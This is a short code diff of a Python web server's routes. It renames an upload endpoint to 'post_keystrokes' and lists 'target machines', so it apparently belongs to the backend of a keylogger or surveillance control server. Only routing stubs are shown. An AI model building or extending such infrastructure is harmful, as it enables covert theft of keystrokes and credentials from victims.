@@ -14,7 +14,7 @@ def login():
     return controllers.handle_login(request)
 
 @app.post("/api/notifications")
-def notifications():
+def save_notifications():
     return controllers.handle_notifications(request)
 
 @app.get("/api/get_notifications")
@@ -22,12 +22,16 @@ def get_notifications():
     return controllers.handle_get_notifications()
 
 @app.post("/api/delete_notification")
-def delete_notifications():
+def delete_notification():
     return controllers.handle_delete_notifications(request)
 
+@app.get("/api/get_warnings")
+def get_warnings():
+    return controllers.handle_get_warnings()
+
 @app.post("/api/upload")
-def upload():
-    return controllers.handle_upload(request)
+def post_keystrokes():
+    return controllers.handle_keystrokes(request)
 
 @app.get("/api/get_target_machines_list")
 def get_machines():
